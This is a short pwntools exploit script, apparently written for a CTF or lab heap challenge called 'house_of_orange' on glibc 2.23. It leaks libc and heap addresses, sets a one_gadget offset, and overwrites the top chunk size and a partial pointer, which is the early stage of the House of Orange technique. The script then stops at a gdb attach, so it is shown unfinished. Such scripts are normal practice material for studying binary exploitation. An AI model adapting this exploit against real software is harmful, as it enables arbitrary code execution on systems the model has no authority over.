from pwn import *
p=process('./house_of_orange')
elf=ELF('./house_of_orange')
libc=ELF('/home/cutecabbage/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
one_gadget=0x4527a
p.recvuntil(b'0x')
puts_addr=int(p.recv(12),16)
print('puts',hex(puts_addr))
p.recvuntil(b'0x')
heap_addr=int(p.recv(12),16)
print('heap',hex(heap_addr))
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b': ',b'a'*0x10+p64(0)+p64(0xfe1))
p.sendlineafter(b'> ',b'2')
print('libc.sym._IO_list_all',hex(libc.sym._IO_list_all))
p.sendlineafter(b'> ',b'3')
p.sendafter(b': ',b'a'*0x10+p64(0)+p64(0xfc1)+b'\x20\x55')

gdb.attach(p)
p.interactive()